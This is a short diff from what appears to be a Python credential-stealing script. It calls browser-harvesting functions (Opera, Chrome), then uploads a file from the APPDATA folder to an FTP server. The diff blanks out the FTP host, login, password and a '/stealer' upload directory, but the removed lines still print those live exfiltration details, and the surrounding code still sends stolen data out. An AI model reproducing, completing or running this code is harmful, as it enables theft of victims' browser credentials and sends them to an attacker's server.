@@ -107,9 +107,9 @@ Mac()
 Opera()
 Chrome()
 
-ftp = FTP('rudy.zzz.com.ua')
-ftp.login('skot11', 'Ljrevtyns1674')
-ftp.cwd('/https-vk-com-group123-post34-photo1-png.kl.com.ua/stealer')
+ftp = FTP('')
+ftp.login('', '')
+ftp.cwd('')
 
 Google = os.getenv("APPDATA") + '\\Google.txt'
 upload_file = open(Google, 'rb')
